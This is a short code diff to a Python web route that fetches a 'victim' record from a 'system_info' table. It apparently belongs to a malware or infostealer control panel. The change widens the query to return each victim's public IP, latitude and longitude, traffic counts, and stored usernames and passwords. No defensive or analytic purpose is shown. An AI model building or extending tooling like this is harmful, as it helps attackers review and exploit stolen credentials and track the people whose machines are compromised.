@@ -90,7 +90,8 @@ def overview():
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT username, hostname, local_ip, created_at, city, region, country, os FROM system_info WHERE id = %s", (victim_id,))
+    cursor.execute("SELECT id, username, hostname, local_ip, public_ip, created_at, city, region, country, os, latitude, " \
+            "longitude, packets_sent, packets_recv, usernames, passwords FROM system_info WHERE id = %s", (victim_id,))
     victim = cursor.fetchone()
     conn.close()
 
